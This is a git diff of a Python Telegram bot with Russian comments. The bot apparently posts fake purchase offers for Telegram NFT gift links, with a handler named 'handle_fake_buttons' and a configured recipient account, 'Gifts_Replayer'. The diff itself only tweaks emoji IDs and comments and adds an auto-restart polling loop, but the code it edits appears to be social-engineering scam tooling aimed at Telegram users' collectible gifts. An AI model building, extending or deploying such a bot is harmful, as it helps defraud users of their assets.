@@ -20,17 +20,15 @@ try:
 except ValueError:
     ADMIN_ID = 0
 
-# --- ИЗМЕНЕН ТОЛЬКО ЮЗЕРНЕЙМ ЗДЕСЬ ---
+# --- НАСТРОЙКА ПОЛУЧАТЕЛЯ ---
 DEFAULT_TARGET = "Gifts_Replayer"
-# ------------------------------------
 
 # --- НАСТРОЙКИ ПРОВЕРКИ (ГРУППА) ---
 TARGET_CHAT_ID = -1003747516067 
 INVITE_LINK = "https://t.me/+7WMVJ9ajTHU2NDFi"
-# ------------------------------------
 
-# ID анимированной звезды Telegram Premium
-PREMIUM_STAR_ID = "5368324170671202286"
+# --- ID АНИМИРОВАННОЙ ЗВЕЗДЫ TELEGRAM PREMIUM ---
+PREMIUM_STAR_ID = "5874948844935974490"
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
@@ -275,6 +273,7 @@ async def handle_offer_command(message: types.Message):
     currency = "stars"
     lang = "ru"
     
+    # Умный парсер: ищем валюту и язык где угодно
     for p in parts[3:]:
         p_lower = p.lower()
         if p_lower in ["stars", "gram"]:
@@ -282,16 +281,16 @@ async def handle_offer_command(message: types.Message):
         elif p_lower in ["ru", "en", "ua", "ar"]:
             lang = p_lower
 
-    # --- ЛОГИКА ПРЕМИУМ ЗВЕЗДЫ ---
+    # --- ЛОГИКА ПРЕМИУМ ЗВЕЗДЫ (ДЛЯ ОТПРАВИТЕЛЯ) ---
     if currency == "stars":
         if message.from_user.is_premium:
-            symbol = f'<tg-emoji emoji-id="{PREMIUM_STAR_ID}">⭐</tg-emoji>'
+            symbol = f'<tg-emoji emoji-id="{PREMIUM_STAR_ID}">⭐️</tg-emoji>'
         else:
-            symbol = "⭐"
+            symbol = "⭐️"
     elif currency == "gram":
         symbol = "GRAM"
     else:
-        symbol = "⭐"
+        symbol = "⭐️"
 
     match = re.search(r"t\.me/nft/([a-zA-Z0-9_-]+-\d+)", link)
     if not match: return
@@ -340,16 +339,16 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
         
     action, gift_slug, amount, currency, lang = data_parts
     
-    # --- ЛОГИКА ПРЕМИУМ ЗВЕЗДЫ ПРИ НАЖАТИИ ---
+    # --- ЛОГИКА ПРЕМИУМ ЗВЕЗДЫ (ДЛЯ ТОГО, КТО НАЖАЛ КНОПКУ) ---
     if currency == "stars":
         if callback.from_user.is_premium:
-            symbol = f'<tg-emoji emoji-id="{PREMIUM_STAR_ID}">⭐</tg-emoji>'
+            symbol = f'<tg-emoji emoji-id="{PREMIUM_STAR_ID}">⭐️</tg-emoji>'
         else:
-            symbol = "⭐"
+            symbol = "⭐️"
     elif currency == "gram":
         symbol = "GRAM"
     else:
-        symbol = "⭐"
+        symbol = "⭐️"
     
     sender_username = callback.message.from_user.username.lower() if callback.message.from_user and callback.message.from_user.username else "no_username"
     
@@ -401,9 +400,15 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
     else:
         await callback.answer()
 
+# --- АВТОПЕРЕПОДКЛЮЧЕНИЕ ПРИ ПАДЕНИИ ---
 async def main():
-    print("Бот запущен...")
-    await dp.start_polling(bot)
+    while True:
+        try:
+            print("Бот запущен...")
+            await dp.start_polling(bot)
+        except Exception as e:
+            print(f"Polling упал: {e}. Перезапуск через 5 секунд...")
+            await asyncio.sleep(5)
 
 if __name__ == "__main__":
     asyncio.run(main())
